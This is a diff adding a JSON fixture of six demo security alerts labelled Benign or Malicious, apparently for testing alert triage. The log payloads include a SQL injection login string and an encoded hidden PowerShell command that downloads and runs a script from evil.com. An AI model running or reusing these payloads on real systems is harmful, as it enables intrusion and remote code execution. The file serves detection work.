@@ -1,0 +1,62 @@
+[
+  {
+    "alert_id": "DEMO-001",
+    "timestamp": "2026-04-12T09:15:30Z",
+    "source_ip": "45.133.1.22",
+    "destination_ip": "192.168.1.10",
+    "service": "http_server",
+    "event_type": "SQL Injection",
+    "log_payload": "GET /login.php?user=admin%27+OR+%271%27%3D%271 HTTP/1.1 - 403 Forbidden - User-Agent: sqlmap/1.5",
+    "true_label": "Malicious"
+  },
+  {
+    "alert_id": "DEMO-002",
+    "timestamp": "2026-04-12T00:00:05Z",
+    "source_ip": "192.168.1.5",
+    "destination_ip": "archive.ubuntu.com",
+    "service": "os_kernel",
+    "event_type": "System Update",
+    "log_payload": "{\"eventSource\": \"apt-get\", \"eventName\": \"Update\", \"package\": \"kernel-5.15.0-1160\", \"status\": \"Success\", \"user\": \"root\", \"scheduledTask\": true, \"command\": \"sudo apt-get update && sudo apt-get upgrade -y\", \"downloadSize\": \"150MB\"}",
+    "true_label": "Benign"
+  },
+  {
+    "alert_id": "DEMO-003",
+    "timestamp": "2026-04-12T03:04:11Z",
+    "source_ip": "192.168.1.55",
+    "destination_ip": "103.205.12.99",
+    "service": "firewall_egress",
+    "event_type": "Data Exfiltration",
+    "log_payload": "OUTBOUND CONNECTION: Sent 4.5GB data via port 443 to external host. Duration: 450s. Protocol: Encrypted.",
+    "true_label": "Malicious"
+  },
+  {
+    "alert_id": "DEMO-004",
+    "timestamp": "2026-04-12T14:22:10Z",
+    "source_ip": "192.168.1.102",
+    "destination_ip": "192.168.1.10",
+    "service": "auth_server",
+    "event_type": "Failed Login",
+    "log_payload": "Event: Login_Failed. User: 'sarah.j'. Count: 2 attempts. Reason: Invalid Credentials. Source: Office_WiFi. Note: User successfully authenticated 30 seconds later.",
+    "true_label": "Benign"
+  },
+  {
+    "alert_id": "DEMO-005",
+    "timestamp": "2026-04-12T22:41:00Z",
+    "source_ip": "10.0.5.30",
+    "destination_ip": "199.201.5.1",
+    "service": "ids_alert",
+    "event_type": "C2 Callback",
+    "log_payload": "IDS ALERT: ET TROJAN Cobalt Strike Beacon Activity detected. Outbound connection from 10.0.5.30 to 199.201.5.1:443. Interval: 60s. Payload size: 92 bytes. JA3 hash: a0e9f5d64349fb13191bc781f81f42e1",
+    "true_label": "Malicious"
+  },
+  {
+    "alert_id": "DEMO-006",
+    "timestamp": "2026-04-12T11:05:33Z",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "192.168.1.50",
+    "service": "powershell",
+    "event_type": "Obfuscated PowerShell",
+    "log_payload": "Windows PowerShell: EventID 4104; ScriptBlockText: powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+    "true_label": "Malicious"
+  }
+]
